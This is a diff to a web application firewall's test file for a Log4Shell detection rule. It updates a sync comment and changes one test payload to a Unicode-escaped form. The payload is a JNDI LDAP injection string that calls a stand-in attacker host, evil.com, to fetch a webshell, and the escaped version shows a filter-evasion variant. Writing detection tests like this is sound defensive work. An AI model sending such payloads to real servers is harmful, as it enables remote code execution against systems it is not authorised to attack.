@@ -1,6 +1,6 @@
 ---
-# NOTE: Please keep these tests in sync with 944151.yaml.
-#       944151 should detect the same things as 944150.
+# NOTE: Please keep these tests in sync with 944151.yaml and 944152.yaml.
+#       944150 should detect the same things as 944151 and 944152.
 meta:
   author: "dune73, Max Leske, azurit"
 rule_id: 944150
@@ -196,7 +196,7 @@ tests:
           method: POST
           port: 80
           uri: "/post"
-          data: '{"foo": "${jndi:ldap://evil.com/webshell}"}'
+          data: '{"foo": "$\u007bjndi:ldap://evil.com/webshell}"}'
           version: "HTTP/1.1"
         output:
           log:
